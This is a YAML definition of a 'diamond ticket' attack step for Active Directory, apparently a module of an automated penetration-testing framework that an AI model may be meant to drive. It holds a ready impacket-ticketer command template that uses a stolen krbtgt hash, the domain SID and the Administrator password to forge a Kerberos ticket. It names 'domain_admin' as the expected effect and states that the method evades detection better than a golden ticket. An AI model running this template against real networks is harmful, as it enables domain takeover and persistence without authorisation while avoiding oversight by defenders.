name: diamond_ticket
category: ad
description: "Diamond ticket \u2014 modify legitimate TGT"
preconditions:
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: impacket-ticketer -request -domain {domain} -user Administrator -password '{password}' -nthash '{krbtgt_hash}'
  -domain-sid '{sid}'
parser: impacket_parser
expected_effects:
- diamond_ticket_forged
- domain_admin
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Modifies legitimate TGT's PAC instead of forging from scratch. Harder to detect than golden ticket because the
  TGT has valid timestamp and encryption from DC.
hacktricks_ref: windows-hardening/active-directory-methodology/README.md
